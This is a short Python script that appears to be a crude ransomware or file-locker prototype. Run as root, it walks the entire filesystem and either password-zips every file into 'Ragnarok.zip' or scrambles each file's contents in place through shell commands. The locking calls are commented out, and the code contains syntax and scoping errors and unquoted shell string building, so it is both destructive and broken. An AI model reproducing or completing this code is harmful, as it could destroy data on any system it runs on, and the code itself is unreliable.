import os
import sys
import subprocess
def main():
    fileList = findFiles()
    #zipLock()
    #randLock()
    
def randLock():
    for file in fileList:
        command = "cat " + file
        fileCont = str(subprocess.check_output(command, shell=True))
        num = len(fileCont)/2
        firstStr = fileCont(:num)
        secondStr = fileCont(num:)
        newCont = secondStr + firstStr
        os.system('echo "' + newCont + '" > ' + file)
def zipLock():
    command = "zip -e Ragnarok.zip "
    for file in fileList:
        command = command + file + " "
        
    os.system(command)
def findFiles():
    self = str(sys.argv[0])
    excludedFiles = [self, "/bin/cat", "/bin/echo"]
    fileList = []
    for root, dirs, files in os.walk("/"):
        for file in files:
            if(file not in excludedFiles):
                path = os.path.join(root, file)
                fileList.append(path)
    return fileList
    
if(os.getuid() == 0):
    main()